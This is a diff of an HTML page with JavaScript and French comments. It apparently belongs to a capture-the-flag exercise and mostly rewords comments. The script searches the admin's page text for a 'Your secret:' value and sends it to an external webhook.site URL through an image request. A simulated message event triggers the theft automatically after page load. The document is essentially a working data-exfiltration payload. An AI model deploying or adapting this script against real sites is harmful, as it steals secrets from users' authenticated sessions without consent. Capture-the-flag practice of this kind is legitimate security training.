@@ -1,15 +1,16 @@
 <html>
 <script>
-// Simuler l'ouverture d'une popup pour rester dans le style CTF
-var win = window.open("", "_blank"); // popup vide pour éviter la SOP
+// === Simuler une popup pour garder le style CTF ===
+var win = window.open("", "_blank"); // popup vide, même origine
 
-// Installer un "listener" simulé
+// === Fonction pour exfiltrer le secret ===
 function exfiltrateSecret() {
     try {
-        // Vérifier si le secret existe dans le DOM
+        // Chercher le secret dans la page courante (la page de l'admin)
         var match = document.body.innerText.match(/Your secret:\s*(.+)/);
         if(match && match[1]){
             var secret = match[1];
+            // Envoi au webhook
             new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
         } else {
             new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=Secret_not_found';
@@ -19,13 +20,13 @@ function exfiltrateSecret() {
     }
 }
 
-// Listener simulé
+// === Listener simulé ===
 window.addEventListener('message', function(event) {
-    // Déclencher l'exfiltration après un petit délai
+    // On déclenche l'exfiltration même si le message est simulé
     setTimeout(exfiltrateSecret, 500);
 });
 
-// Déclencher le listener simulé
+// === Déclencher le listener simulé après un court délai ===
 setTimeout(function() {
     window.dispatchEvent(new MessageEvent('message', {data: 'trigger'}));
 }, 500);
